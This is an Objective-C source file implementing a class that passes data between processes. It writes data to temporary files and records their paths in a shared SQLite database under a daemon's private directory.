//
//  SharedFile2IPCSender.m
//  IPC
//
//  Created by Makara Khloth on 1/3/14.
//  Copyright 2014 Vervata. All rights reserved.
//

#import "SharedFile2IPCSender.h"
#import "FxDatabase.h"
#import "FMDatabase.h"
#import "DaemonPrivateHome.h"

static NSString *const kCreateTableSharedFile2One	= @"CREATE TABLE one (seq INTEGER PRIMARY KEY AUTOINCREMENT,"
															"blob BLOB NOT NULL, bool INTEGER)";
static NSString *const kCreateTableSharedFile2Two	= @"CREATE TABLE two (seq INTEGER PRIMARY KEY AUTOINCREMENT,"
															"blob BLOB NOT NULL)";

static NSString *const kCreateIndexSharedFile2One	= @"CREATE INDEX one_index ON one (seq)";
static NSString *const kCreateIndexSharedFile2Two	= @"CREATE INDEX two_index ON two (seq)";

@interface SharedFile2IPCSender (private)
- (void) openDatabase;
@end

@implementation SharedFile2IPCSender

- (id) initWithSharedFileName: (NSString*) aSharedFileName {
	if ((self = [super init])) {
		mSharedFileName = [[NSString alloc] initWithString:aSharedFileName];
		[self openDatabase];
	}
	return (self);
}

- (BOOL) writeDataToSharedFile: (NSData*) aRawData {
	BOOL write = NO;
	NSFileManager *fm = [NSFileManager defaultManager];
	NSString *privateHome = [DaemonPrivateHome daemonPrivateHome];
	NSString *sharedFilePath = [privateHome stringByAppendingString:@"etc/"];
	NSString *sharedFileFullPath = [sharedFilePath stringByAppendingString:mSharedFileName];
	if ([fm fileExistsAtPath:sharedFileFullPath]) {
		FMDatabase *db = [mDatabase mDatabase];
		FMResultSet *rs = [db executeQuery:@"select blob from two where seq = 1"];
		if ([rs next]) {
			NSData *blob = [rs dataForColumnIndex:0];
			BOOL enable = NO;
			[blob getBytes:&enable length:sizeof(BOOL)];
			if (enable) {
				sqlite_int64 lastRowID = [db lastInsertRowId];
				NSTimeInterval ti = [[NSDate date] timeIntervalSince1970];
				NSString *uniqueName = [NSString stringWithFormat:@"%@-%lld-%f", mSharedFileName, lastRowID, ti];
				NSString *filePath = [NSString stringWithFormat:@"/tmp/%@", uniqueName];
				
				write = [aRawData writeToFile:filePath atomically:YES];
				if (!write) {
                    // Note iOS 8,9.. cannot write data to /tmp for sandbox applications
                    filePath = [NSString stringWithFormat:@"%@%@", NSTemporaryDirectory(), uniqueName];
                    
                    write = [aRawData writeToFile:filePath atomically:YES];
                    if (!write) {
                        DLog (@"lastRowID   = %lld", lastRowID)
                        DLog (@"ti          = %f", ti)
                        DLog (@"uniqueName  = %@", uniqueName)
                        DLog (@"filePath    = %@", filePath)
                        DLog (@"aRawData    = %@", aRawData)
                        
                        DLog (@"Saving blob to tmp file, %d", write)
                    }
                }
				
				// Insert file path to db as blob
				NSData *data = [filePath dataUsingEncoding:NSUTF8StringEncoding];
				write = [db executeUpdate:@"insert into one values(NULL,?,0)", data];
                
                if (([db lastErrorCode] != SQLITE_OK) || !write) {
                    DLog (@"data        = %@", data)
                    
                    DLog (@"Saving blob to shared file, %d", write)
                    DLog (@"lastErrorMessage, code of upating shared file {one}, %@, %d", [db lastErrorMessage], [db lastErrorCode])
                }
			}
		}
        
        if ([db lastErrorCode] != SQLITE_OK) {
            DLog(@"lastErrorMessage, code of accessing shared file {two}, %@, %d", [db lastErrorMessage], [db lastErrorCode])
        }
	}
	return (write);
}

- (void) openDatabase {
	NSFileManager *fm = [NSFileManager defaultManager];
	NSString *privateHome = [DaemonPrivateHome daemonPrivateHome];
	NSString *sharedFilePath = [privateHome stringByAppendingString:@"etc/"];
	NSString *sharedFileFullPath = [sharedFilePath stringByAppendingString:mSharedFileName];
	if ([fm fileExistsAtPath:sharedFileFullPath]) {
		mDatabase = [[FxDatabase alloc] initDatabaseWithPath:sharedFileFullPath];
		[mDatabase openDatabase];
		
		NSString *cachePath = [NSString stringWithFormat:@"%@.cache", sharedFileFullPath];
		mCacheDatabase = [[FxDatabase alloc] initDatabaseWithPath:cachePath];
		[mCacheDatabase openDatabase];
	} else {
		mDatabase = [[FxDatabase alloc] initDatabaseWithPath:sharedFileFullPath];
		[mDatabase openDatabase];
		[mDatabase createDatabaseSchema:kCreateTableSharedFile2One];
		[mDatabase createDatabaseSchema:kCreateTableSharedFile2Two];
		
		[mDatabase createDatabaseSchema:kCreateIndexSharedFile2One];
		[mDatabase createDatabaseSchema:kCreateIndexSharedFile2Two];
		
		//[mDatabase createDatabaseSchema:kDeleteRowTriggerOne];
		
		NSString *cachePath = [NSString stringWithFormat:@"%@.cache", sharedFileFullPath];
		mCacheDatabase = [[FxDatabase alloc] initDatabaseWithPath:cachePath];
		[mCacheDatabase openDatabase];
		[mCacheDatabase createDatabaseSchema:@"create table cache(last_seq integer)"];
		[mCacheDatabase createDatabaseSchema:@"create index cache_index on cache(last_seq)"];
		[mCacheDatabase createDatabaseSchema:@"insert or replace into cache (last_seq) values (0)"];
	}
}

- (void) dealloc {
	[mSharedFileName release];
	[mDatabase closeDatabase];
	[mDatabase release];
	[mCacheDatabase closeDatabase];
	[mCacheDatabase release];
	[super dealloc];
}

@end
